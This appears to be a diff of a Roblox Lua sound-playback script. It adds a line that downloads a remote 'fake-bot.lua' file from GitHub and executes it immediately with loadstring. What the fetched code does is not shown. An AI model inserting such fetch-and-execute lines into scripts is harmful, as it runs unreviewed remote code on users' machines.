@@ -25,6 +25,7 @@ local sduration = (60 * 4) + 38
 -- path, duration
 local intro = addsound("L-sound-package/intro.mp3", 20, false)
 task.wait(8)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/JokoFernandes/Relxzty/refs/heads/main/Workspace/El%20Konten/fake-bot.lua"))()
 local backsound = addsound("L-sound-package/backsound.mp3", sduration, false)
 local backsound2 = addsound("L-sound-package/backsound2.mp3", sduration, true)
 task.wait(2)
